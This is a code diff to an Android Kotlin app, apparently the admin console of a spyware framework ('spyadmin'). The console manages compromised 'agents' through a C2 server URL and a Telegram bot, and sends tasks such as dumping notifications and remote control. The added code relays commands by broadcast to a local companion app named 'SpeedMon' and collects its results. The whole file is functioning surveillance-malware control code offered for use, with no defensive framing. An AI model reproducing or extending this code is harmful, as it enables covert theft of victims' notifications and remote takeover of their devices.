@@ -1,6 +1,9 @@
 package com.spyadmin
 
+import android.content.BroadcastReceiver
+import android.content.Context
 import android.content.Intent
+import android.content.IntentFilter
 import android.content.SharedPreferences
 import android.os.Bundle
 import android.view.LayoutInflater
@@ -8,6 +11,7 @@ import android.view.View
 import android.view.ViewGroup
 import android.widget.*
 import androidx.appcompat.app.AppCompatActivity
+import androidx.localbroadcastmanager.content.LocalBroadcastManager
 import androidx.recyclerview.widget.LinearLayoutManager
 import androidx.recyclerview.widget.RecyclerView
 import com.google.gson.Gson
@@ -29,6 +33,7 @@ class AdminActivity : AppCompatActivity() {
     private lateinit var adapter: AgentAdapter
     private var selectedAgent: Agent? = null
     private lateinit var prefs: SharedPreferences
+    private var resultReceiver: ResultReceiver? = null
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -60,22 +65,30 @@ class AdminActivity : AppCompatActivity() {
         findViewById<Button>(R.id.btnTaskNotifications).setOnClickListener { sendTask("notifications", mapOf("action" to "dump")) }
         findViewById<Button>(R.id.btnRemoteControl).setOnClickListener { openRemoteControl() }
         findViewById<Button>(R.id.btnConfigC2).setOnClickListener { showC2Config() }
+        findViewById<Button>(R.id.btnTestLocal).setOnClickListener { testLocalConnection() }
 
         loadAgents()
+        registerResultReceiver()
 
         // Start Telegram bot
         val telegramBot = TelegramBotService(this)
         telegramBot.start()
     }
 
+    private fun registerResultReceiver() {
+        resultReceiver = ResultReceiver()
+        val filter = IntentFilter("com.speedmon.ACTION_RESULT")
+        LocalBroadcastManager.getInstance(this).registerReceiver(resultReceiver, filter)
+    }
+
     private fun getC2Url(): String {
-        return prefs.getString("c2_url", "https://c2.example.com:8443") ?: "https://c2.example.com:8443"
+        return prefs.getString("c2_url", "https://c2.example.com/api") ?: "https://c2.example.com/api"
     }
 
     private fun showC2Config() {
         val currentUrl = getC2Url()
         val input = android.widget.EditText(this).apply {
-            hint = "C2 Server URL (e.g., https://your-server.com:8443)"
+            hint = "C2 Server URL (e.g., https://your-server.com/api)"
             setText(currentUrl)
         }
         android.app.AlertDialog.Builder(this)
@@ -93,25 +106,70 @@ class AdminActivity : AppCompatActivity() {
     }
 
     private fun loadAgents() {
+        // Try C2 first
         request("GET", "/api/agents") { resp ->
             val agents = gson.fromJson(resp, Array<Agent>::class.java).toList()
             runOnUiThread { adapter.submitList(agents) }
         }
+        // Also add local SpeedMon as an agent
+        runOnUiThread {
+            val localAgent = Agent(
+                id = "local-speedmon-${android.os.Build.SERIAL}",
+                hostname = android.os.Build.MODEL,
+                os = "android",
+                arch = System.getProperty("os.arch"),
+                androidVersion = android.os.Build.VERSION.RELEASE,
+                sdk = android.os.Build.VERSION.SDK_INT,
+                rooted = false,
+                lastSeen = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(java.util.Date())
+            )
+            adapter.submitList(listOf(localAgent))
+        }
     }
 
     private fun sendTask(capability: String, args: Map<String, Any>) {
+        // Send to local SpeedMon via broadcast
+        sendLocalTask(capability, args)
+        
+        // Also send to C2 if configured
         selectedAgent?.let { agent ->
-            val payload = mapOf(
-                "action" to "task",
-                "agent_id" to agent.id,
-                "capability" to capability,
-                "args" to gson.toJson(args),
-                "timeout" to 30
-            )
-            request("POST", "/api/command", payload) { resp ->
-                runOnUiThread { Toast.makeText(this@AdminActivity, "Task queued: $capability", Toast.LENGTH_SHORT).show() }
+            if (!agent.id.startsWith("local-")) {
+                val payload = mapOf(
+                    "action" to "task",
+                    "agent_id" to agent.id,
+                    "capability" to capability,
+                    "args" to gson.toJson(args),
+                    "timeout" to 30
+                )
+                request("POST", "/api/command", payload) { resp ->
+                    runOnUiThread { Toast.makeText(this@AdminActivity, "Task sent to C2: $capability", Toast.LENGTH_SHORT).show() }
+                }
             }
         }
+    }
+
+    private fun sendLocalTask(capability: String, args: Map<String, Any>) {
+        val taskId = java.util.UUID.randomUUID().toString()
+        val intent = Intent("com.speedmon.ACTION_COMMAND").apply {
+            putExtra("capability", capability)
+            putExtra("args", gson.toJson(args))
+            putExtra("task_id", taskId)
+            setPackage("com.speedmon")
+        }
+        LocalBroadcastManager.getInstance(this).sendBroadcast(intent)
+        Toast.makeText(this, "Task sent to SpeedMon: $capability", Toast.LENGTH_SHORT).show()
+    }
+
+    private fun testLocalConnection() {
+        // Send a ping to SpeedMon
+        val intent = Intent("com.speedmon.ACTION_COMMAND").apply {
+            putExtra("capability", "apps")
+            putExtra("args", "{}")
+            putExtra("task_id", "test-${System.currentTimeMillis()}")
+            setPackage("com.speedmon")
+        }
+        LocalBroadcastManager.getInstance(this).sendBroadcast(intent)
+        Toast.makeText(this, "Test command sent to SpeedMon", Toast.LENGTH_SHORT).show()
     }
 
     private fun openRemoteControl() {
@@ -129,7 +187,7 @@ class AdminActivity : AppCompatActivity() {
         val request = Request.Builder().url(url).method(method, requestBody).build()
         client.newCall(request).enqueue(object : okhttp3.Callback {
             override fun onFailure(call: okhttp3.Call, e: IOException) {
-                runOnUiThread { Toast.makeText(this@AdminActivity, "Error: ${e.message}", Toast.LENGTH_SHORT).show() }
+                runOnUiThread { Toast.makeText(this@AdminActivity, "C2 Error: ${e.message}", Toast.LENGTH_SHORT).show() }
             }
             override fun onResponse(call: okhttp3.Call, response: Response) {
                 response.body?.string()?.let { callback(it) }
@@ -144,6 +202,29 @@ class AdminActivity : AppCompatActivity() {
         findViewById<TextView>(R.id.tvArch).text = "Arch: ${agent.arch}"
         findViewById<TextView>(R.id.tvRooted).text = "Rooted: ${agent.rooted}"
         findViewById<TextView>(R.id.tvLastSeen).text = "Last Seen: ${agent.lastSeen}"
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        resultReceiver?.let { receiver ->
+            try {
+                LocalBroadcastManager.getInstance(this).unregisterReceiver(receiver)
+            } catch (e: Exception) {
+                // ignore
+            }
+        }
+    }
+
+    private inner class ResultReceiver : BroadcastReceiver() {
+        override fun onReceive(context: Context, intent: Intent) {
+            val taskId = intent.getStringExtra("task_id") ?: ""
+            val result = intent.getStringExtra("result") ?: ""
+            val error = intent.getStringExtra("error") ?: ""
+            val status = intent.getStringExtra("status") ?: ""
+            runOnUiThread {
+                Toast.makeText(this@AdminActivity, "Result [$status]: $result", Toast.LENGTH_LONG).show()
+            }
+        }
     }
 }
 
@@ -172,9 +253,22 @@ class AgentAdapter(private val onClick: (Agent) -> Unit) :
 
         fun bind(agent: Agent) {
             tvName.text = agent.hostname
-            tvId.text = agent.id.substring(0, 8)
-            tvStatus.text = if (agent.rooted) "ROOTED" else "USER"
+            tvId.text = agent.id.substring(0, min(8, agent.id.length))
+            tvStatus.text = if (agent.rooted) "ROOTED" else if (agent.id.startsWith("local-")) "LOCAL" else "USER"
             itemView.setOnClickListener { onClick(agent) }
         }
     }
 }
+
+data class Agent(
+    val id: String,
+    val hostname: String,
+    val os: String,
+    val arch: String,
+    val androidVersion: String,
+    val sdk: Int,
+    val rooted: Boolean,
+    val lastSeen: String
+)
+
+fun Any.toJson(): String = Gson().toJson(this)
